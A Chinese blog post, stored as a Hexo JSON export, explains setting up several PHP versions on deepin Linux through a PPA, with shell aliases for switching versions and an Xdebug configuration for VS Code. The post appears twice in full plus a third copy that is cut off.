archive），即个人包档案，里面可以有软件制作者发布的各个版本，一般来说是用来寻找最新版的软件，以防止上述的软件管理包未更新，此处我们用来下载旧包。\n\n由于deepin也是debain系列的系统，所以可以使用ubuntu的添加源的办法来添加ppa源。\n\n首先将源加进到本机的源文件中，然后导入公钥，更新源（如果有依赖需要下一下dirmngr）：\n\n```\necho \"deb http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\" | tee -a /etc/apt/sources.list\n\necho \"deb-src http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\" | tee -a /etc/apt/sources.list\n\napt-key adv --keyserver keyserver.ubuntu.com --recv-keys E5267A6C\n```\n\n添加源如果有问题，加上这句：\n\n```\nsudo apt-get install unknown-horizons\n```\n\n### 2.2 下载php多版本\n\n网上发现了一个不错的文章，里面刚好讲到ubuntu中多版本php的安装，deepin上安装过程大同小异。\n\n```\nsudo apt-get install -y php5.6-common php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-gd php5.6-curl php5.6-json php5.6-fpm php5.6-zip php5.6-mcrypt libapache2-mod-php5.6\n\nsudo apt-get install -y php7.0-common php7.0-mbstring php7.0-mcrypt php7.0-mysql php7.0-xml php7.0-gd php7.0-curl php7.0-json php7.0-fpm php7.0-zip php7.0-mcrypt libapache2-mod-php7.0\n\nsudo apt-get install -y php7.1-common php7.1-mbstring php7.1-mcrypt php7.1-mysql php7.1-xml php7.1-gd php7.1-curl php7.1-json php7.1-fpm php7.1-zip php7.1-mcrypt libapache2-mod-php7.1\n```\n\n上述安装了三个版本，分别是**5.6 7.0 7.1**\n\n下面使用**a2enmod a2dismod**命令来开启或禁用系统的某个模块来完成php版本的快速切换。\n\n```\nsudo a2enmod rewrite #开启重写转向\nsudo a2enmod headers\n```\n\n然后在你的shell配置文件 **~./bashrc 或者 ~/.zshrc** 中添加别名来达到快速切换的目的，原理就是禁用其他php模块，激活要使用的php版本\n\n```\nalias php56='sudo a2dismod php7.0 && sudo a2dismod php7.1 && sudo a2enmod php5.6 && sudo service apache2 restart'\nalias php70='sudo a2dismod php5.6 && sudo a2dismod php7.1 && sudo a2enmod php7.0 && sudo service apache2 restart'\nalias php71='sudo a2dismod php5.6 && sudo a2dismod php7.0 && sudo a2enmod php7.1 && sudo service apache2 restart'\n```\n\n然后 `source ~/.zshrc 或者 /.bashrc`\n\n![img](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522162731.png)\n\n检查版本，默认只显示最高版本，使用上述别名会成功切换php的版本，只不过不会显示在此处。\n\n### 2.3 vscode + xdebug\n\n下个vscode就感觉它的调试十分简便，下面我们来配置下xdebug的断点调试，这里与普通安装php可能有些不同，需注意。\n\n首先，到 xdebug 官网查找对比对应的php版本下的xdebug版本。使用刚刚的别名，切换下不同状态下的php版本，写个 phpinfo() 的脚本来输出到 `https://xdebug.org/wizard.php`,点击 analyse 来分析下应当下载的xdebug版本，这里我直接贴上我的测试结果\n\n```\n5.6 --->20131226\n7.0 --->20151012\n7.1 --->20160303\n```\n\n其实这个强大的网站会自动定位 phpinfo 信息中的配置文件的位置，然后有具体的操作步骤,而生成不同版本对应的 xdebug，下载安装包即可，可以利用 phpize 这个工具来生成对应版本的 xdebug 文件，如果没有可以下载对应版本的扩展：\n\n`sudo apt-get install php5-dev`\n\n**建议扩展从低版本开始下载，因为高版本扩展会优先被识别。**接下来的操作分别是：\n\n- ./configure\n- make\n- make install\n\n然后将对应生成的 xdebug 文件配置信息放到对应 php.ini 文件中：\n\n【这里以5.6 版本为例，其他版本的配置同理，位置 /etc/php/5.6/apache2/php.ini】\n\n将下面这段配置加入到该配置文件中\n\n```\nzend_extension=\"/usr/lib/php/20131226/xdebug.so\"      #之后配置其他版本php的时候只需将这个文件的位置换成上面我贴出的对应文件即可                                                                                                                      \n\nxdebug.remote_enable = 1\n\nxdebug.remote_handler = dbgp\n\nxdebug.remote_mode = req \n\nxdebug.remote_host = 127.0.0.1\n\nxdebug.remote_port = 9002\n\nxdebug.remote_enable = 1\n\nxdebug.remote_autostart = 1\n```\n\n然后保存，在对应版本的php-ini中末尾填上`[xdebug]` 来激活xdebug扩展。\n\n最后重启，php56,来检查下是否配置成功。\n\n![img](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522164713.png)\n\n配置成功！愉快的去审计叭～\n\n## 3 @ 总结\n\n推荐下黄老板和比伯的新歌 **<I Don’t care>**，已经被洗脑了。真好～\n\nReference：\n\n`https://www.jianshu.com/p/dedd2818c7f9`\n\n`https://zhidao.baidu.com/question/1670867120091087107.html`\n\n`https://blog.csdn.net/zhousmq/article/details/77765451`\n\n`https://www.cnblogs.com/wangshuyi/p/8512036.html`\n","slug":"deepin下多版本php的配置","published":1,"updated":"2019-09-22T05:11:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgb0002mp7gqogn2zz2","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>之前博客上的一篇文章，稍有改动。</p>\n<h2 id=\"2-过程\"><a href=\"#2-过程\" class=\"headerlink\" title=\"2@ 过程\"></a>2@ 过程</h2><h3 id=\"2-1-什么是ppa\"><a href=\"#2-1-什么是ppa\" class=\"headerlink\" title=\"2.1 什么是ppa\"></a>2.1 什么是ppa</h3><p>首先需要了解下<strong>ppa</strong>：</p>\n<p>大多数linux的软件管理包，如 centos 的 yum，debain 的 apt 一般都是不断更新自己软件库里面的一些应用，所以我们默认下载到的应当是最新版本的软件，那么如果软件仓库里面的软件被撤下，我们又想下载老版本的时候，就会用到<strong>ppa</strong>这个东西</p>\n<p><strong>ppa</strong>（personal package archive），即个人包档案，里面可以有软件制作者发布的各个版本，一般来说是用来寻找最新版的软件，以防止上述的软件管理包未更新，此处我们用来下载旧包。</p>\n<p>由于deepin也是debain系列的系统，所以可以使用ubuntu的添加源的办法来添加ppa源。</p>\n<p>首先将源加进到本机的源文件中，然后导入公钥，更新源（如果有依赖需要下一下dirmngr）：</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"deb http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\"</span> | tee -a <span class=\"hljs-string\">/etc/apt/sources.list</span><br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"deb-src http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\"</span> | tee -a <span class=\"hljs-string\">/etc/apt/sources.list</span><br><br>apt-key adv <span class=\"hljs-params\">--keyserver</span> keyserver.ubuntu.com <span class=\"hljs-params\">--recv-keys</span> E5267A6C<br></code></pre></td></tr></table></figure>\n\n<p>添加源如果有问题，加上这句：</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">sudo apt-<span class=\"hljs-built_in\">get</span> install <span class=\"hljs-literal\">unknown</span>-horizons<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-下载php多版本\"><a href=\"#2-2-下载php多版本\" class=\"headerlink\" title=\"2.2 下载php多版本\"></a>2.2 下载php多版本</h3><p>网上发现了一个不错的文章，里面刚好讲到ubuntu中多版本php的安装，deepin上安装过程大同小异。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-common</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mbstring</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mcrypt</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mysql</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-xml</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-gd</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-curl</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-json</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-fpm</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-zip</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php5</span><span class=\"hljs-selector-class\">.6</span><br><br><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-common</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mbstring</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mcrypt</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mysql</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-xml</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-gd</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-curl</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-json</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-fpm</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-zip</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php7</span><span class=\"hljs-selector-class\">.0</span><br><br><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-common</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mbstring</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mcrypt</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mysql</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-xml</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-gd</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-curl</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-json</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-fpm</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-zip</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php7</span><span class=\"hljs-selector-class\">.1</span><br></code></pre></td></tr></table></figure>\n\n<p>上述安装了三个版本，分别是<strong>5.6 7.0 7.1</strong></p>\n<p>下面使用<strong>a2enmod a2dismod</strong>命令来开启或禁用系统的某个模块来完成php版本的快速切换。</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">sudo</span> a2enmod rewrite <span class=\"hljs-comment\">#开启重写转向</span><br>sudo a2enmod headers<br></code></pre></td></tr></table></figure>\n\n<p>然后在你的shell配置文件 <strong>~./bashrc 或者 ~/.zshrc</strong> 中添加别名来达到快速切换的目的，原理就是禁用其他php模块，激活要使用的php版本</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">alias php56='sudo a2dismod php7.0 &amp;&amp; sudo a2dismod php7.1 &amp;&amp; sudo a2enmod php5.6 &amp;&amp; sudo service apache2 restart'<br>alias php70='sudo a2dismod php5.6 &amp;&amp; sudo a2dismod php7.1 &amp;&amp; sudo a2enmod php7.0 &amp;&amp; sudo service apache2 restart'<br>alias php71='sudo a2dismod php5.6 &amp;&amp; sudo a2dismod php7.0 &amp;&amp; sudo a2enmod php7.1 &amp;&amp; sudo service apache2 restart'<br></code></pre></td></tr></table></figure>\n\n<p>然后 <code>source ~/.zshrc 或者 /.bashrc</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522162731.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"img\"></p>\n<p>检查版本，默认只显示最高版本，使用上述别名会成功切换php的版本，只不过不会显示在此处。</p>\n<h3 id=\"2-3-vscode-xdebug\"><a href=\"#2-3-vscode-xdebug\" class=\"headerlink\" title=\"2.3 vscode + xdebug\"></a>2.3 vscode + xdebug</h3><p>下个vscode就感觉它的调试十分简便，下面我们来配置下xdebug的断点调试，这里与普通安装php可能有些不同，需注意。</p>\n<p>首先，到 xdebug 官网查找对比对应的php版本下的xdebug版本。使用刚刚的别名，切换下不同状态下的php版本，写个 phpinfo() 的脚本来输出到 <code>https://xdebug.org/wizard.php</code>,点击 analyse 来分析下应当下载的xdebug版本，这里我直接贴上我的测试结果</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">5.6</span> ---&gt;<span class=\"hljs-number\">20131226</span><br><span class=\"hljs-number\">7.0</span> ---&gt;<span class=\"hljs-number\">20151012</span><br><span class=\"hljs-number\">7.1</span> ---&gt;<span class=\"hljs-number\">20160303</span><br></code></pre></td></tr></table></figure>\n\n<p>其实这个强大的网站会自动定位 phpinfo 信息中的配置文件的位置，然后有具体的操作步骤,而生成不同版本对应的 xdebug，下载安装包即可，可以利用 phpize 这个工具来生成对应版本的 xdebug 文件，如果没有可以下载对应版本的扩展：</p>\n<p><code>sudo apt-get install php5-dev</code></p>\n<p><strong>建议扩展从低版本开始下载，因为高版本扩展会优先被识别。</strong>接下来的操作分别是：</p>\n<ul>\n<li>./configure</li>\n<li>make</li>\n<li>make install</li>\n</ul>\n<p>然后将对应生成的 xdebug 文件配置信息放到对应 php.ini 文件中：</p>\n<p>【这里以5.6 版本为例，其他版本的配置同理，位置 /etc/php/5.6/apache2/php.ini】</p>\n<p>将下面这段配置加入到该配置文件中</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">zend_extension</span>=<span class=\"hljs-string\">\"/usr/lib/php/20131226/xdebug.so\"</span>      <span class=\"hljs-comment\">#之后配置其他版本php的时候只需将这个文件的位置换成上面我贴出的对应文件即可                                                                                                                      </span><br><br><span class=\"hljs-attr\">xdebug.remote_enable</span> = <span class=\"hljs-number\">1</span><br><br><span class=\"hljs-attr\">xdebug.remote_handler</span> = dbgp<br><br><span class=\"hljs-attr\">xdebug.remote_mode</span> = req <br><br><span class=\"hljs-attr\">xdebug.remote_host</span> = <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span><br><br><span class=\"hljs-attr\">xdebug.remote_port</span> = <span class=\"hljs-number\">9002</span><br><br><span class=\"hljs-attr\">xdebug.remote_enable</span> = <span class=\"hljs-number\">1</span><br><br><span class=\"hljs-attr\">xdebug.remote_autostart</span> = <span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<p>然后保存，在对应版本的php-ini中末尾填上<code>[xdebug]</code> 来激活xdebug扩展。</p>\n<p>最后重启，php56,来检查下是否配置成功。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522164713.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"img\"></p>\n<p>配置成功！愉快的去审计叭～</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3 @ 总结\"></a>3 @ 总结</h2><p>推荐下黄老板和比伯的新歌 <strong>&lt;I Don’t care&gt;</strong>，已经被洗脑了。真好～</p>\n<p>Reference：</p>\n<p><code>https://www.jianshu.com/p/dedd2818c7f9</code></p>\n<p><code>https://zhidao.baidu.com/question/1670867120091087107.html</code></p>\n<p><code>https://blog.csdn.net/zhousmq/article/details/77765451</code></p>\n<p><code>https://www.cnblogs.com/wangshuyi/p/8512036.html</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>之前博客上的一篇文章，稍有改动。</p>\n<h2 id=\"2-过程\"><a href=\"#2-过程\" class=\"headerlink\" title=\"2@ 过程\"></a>2@ 过程</h2><h3 id=\"2-1-什么是ppa\"><a href=\"#2-1-什么是ppa\" class=\"headerlink\" title=\"2.1 什么是ppa\"></a>2.1 什么是ppa</h3><p>首先需要了解下<strong>ppa</strong>：</p>\n<p>大多数linux的软件管理包，如 centos 的 yum，debain 的 apt 一般都是不断更新自己软件库里面的一些应用，所以我们默认下载到的应当是最新版本的软件，那么如果软件仓库里面的软件被撤下，我们又想下载老版本的时候，就会用到<strong>ppa</strong>这个东西</p>\n<p><strong>ppa</strong>（personal package archive），即个人包档案，里面可以有软件制作者发布的各个版本，一般来说是用来寻找最新版的软件，以防止上述的软件管理包未更新，此处我们用来下载旧包。</p>\n<p>由于deepin也是debain系列的系统，所以可以使用ubuntu的添加源的办法来添加ppa源。</p>\n<p>首先将源加进到本机的源文件中，然后导入公钥，更新源（如果有依赖需要下一下dirmngr）：</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"deb http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\"</span> | tee -a <span class=\"hljs-string\">/etc/apt/sources.list</span><br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"deb-src http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\"</span> | tee -a <span class=\"hljs-string\">/etc/apt/sources.list</span><br><br>apt-key adv <span class=\"hljs-params\">--keyserver</span> keyserver.ubuntu.com <span class=\"hljs-params\">--recv-keys</span> E5267A6C<br></code></pre></td></tr></table></figure>\n\n<p>添加源如果有问题，加上这句：</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">sudo apt-<span class=\"hljs-built_in\">get</span> install <span class=\"hljs-literal\">unknown</span>-horizons<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-下载php多版本\"><a href=\"#2-2-下载php多版本\" class=\"headerlink\" title=\"2.2 下载php多版本\"></a>2.2 下载php多版本</h3><p>网上发现了一个不错的文章，里面刚好讲到ubuntu中多版本php的安装，deepin上安装过程大同小异。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-common</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mbstring</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mcrypt</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mysql</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-xml</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-gd</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-curl</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-json</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-fpm</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-zip</span> <span class=\"hljs-selector-tag\">php5</span><span class=\"hljs-selector-class\">.6-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php5</span><span class=\"hljs-selector-class\">.6</span><br><br><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-common</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mbstring</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mcrypt</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mysql</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-xml</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-gd</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-curl</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-json</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-fpm</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-zip</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.0-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php7</span><span class=\"hljs-selector-class\">.0</span><br><br><span class=\"hljs-selector-tag\">sudo</span> <span class=\"hljs-selector-tag\">apt-get</span> <span class=\"hljs-selector-tag\">install</span> <span class=\"hljs-selector-tag\">-y</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-common</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mbstring</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mcrypt</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mysql</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-xml</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-gd</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-curl</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-json</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-fpm</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-zip</span> <span class=\"hljs-selector-tag\">php7</span><span class=\"hljs-selector-class\">.1-mcrypt</span> <span class=\"hljs-selector-tag\">libapache2-mod-php7</span><span class=\"hljs-selector-class\">.1</span><br></code></pre></td></tr></table></figure>\n\n<p>上述安装了三个版本，分别是<strong>5.6 7.0 7.1</strong></p>\n<p>下面使用<strong>a2enmod a2dismod</strong>命令来开启或禁用系统的某个模块来完成php版本的快速切换。</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">sudo</span> a2enmod rewrite <span class=\"hljs-comment\">#开启重写转向</span><br>sudo a2enmod headers<br></code></pre></td></tr></table></figure>\n\n<p>然后在你的shell配置文件 <strong>~./bashrc 或者 ~/.zshrc</strong> 中添加别名来达到快速切换的目的，原理就是禁用其他php模块，激活要使用的php版本</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">alias php56='sudo a2dismod php7.0 &amp;&amp; sudo a2dismod php7.1 &amp;&amp; sudo a2enmod php5.6 &amp;&amp; sudo service apache2 restart'<br>alias php70='sudo a2dismod php5.6 &amp;&amp; sudo a2dismod php7.1 &amp;&amp; sudo a2enmod php7.0 &amp;&amp; sudo service apache2 restart'<br>alias php71='sudo a2dismod php5.6 &amp;&amp; sudo a2dismod php7.0 &amp;&amp; sudo a2enmod php7.1 &amp;&amp; sudo service apache2 restart'<br></code></pre></td></tr></table></figure>\n\n<p>然后 <code>source ~/.zshrc 或者 /.bashrc</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522162731.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"img\"></p>\n<p>检查版本，默认只显示最高版本，使用上述别名会成功切换php的版本，只不过不会显示在此处。</p>\n<h3 id=\"2-3-vscode-xdebug\"><a href=\"#2-3-vscode-xdebug\" class=\"headerlink\" title=\"2.3 vscode + xdebug\"></a>2.3 vscode + xdebug</h3><p>下个vscode就感觉它的调试十分简便，下面我们来配置下xdebug的断点调试，这里与普通安装php可能有些不同，需注意。</p>\n<p>首先，到 xdebug 官网查找对比对应的php版本下的xdebug版本。使用刚刚的别名，切换下不同状态下的php版本，写个 phpinfo() 的脚本来输出到 <code>https://xdebug.org/wizard.php</code>,点击 analyse 来分析下应当下载的xdebug版本，这里我直接贴上我的测试结果</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">5.6</span> ---&gt;<span class=\"hljs-number\">20131226</span><br><span class=\"hljs-number\">7.0</span> ---&gt;<span class=\"hljs-number\">20151012</span><br><span class=\"hljs-number\">7.1</span> ---&gt;<span class=\"hljs-number\">20160303</span><br></code></pre></td></tr></table></figure>\n\n<p>其实这个强大的网站会自动定位 phpinfo 信息中的配置文件的位置，然后有具体的操作步骤,而生成不同版本对应的 xdebug，下载安装包即可，可以利用 phpize 这个工具来生成对应版本的 xdebug 文件，如果没有可以下载对应版本的扩展：</p>\n<p><code>sudo apt-get install php5-dev</code></p>\n<p><strong>建议扩展从低版本开始下载，因为高版本扩展会优先被识别。</strong>接下来的操作分别是：</p>\n<ul>\n<li>./configure</li>\n<li>make</li>\n<li>make install</li>\n</ul>\n<p>然后将对应生成的 xdebug 文件配置信息放到对应 php.ini 文件中：</p>\n<p>【这里以5.6 版本为例，其他版本的配置同理，位置 /etc/php/5.6/apache2/php.ini】</p>\n<p>将下面这段配置加入到该配置文件中</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 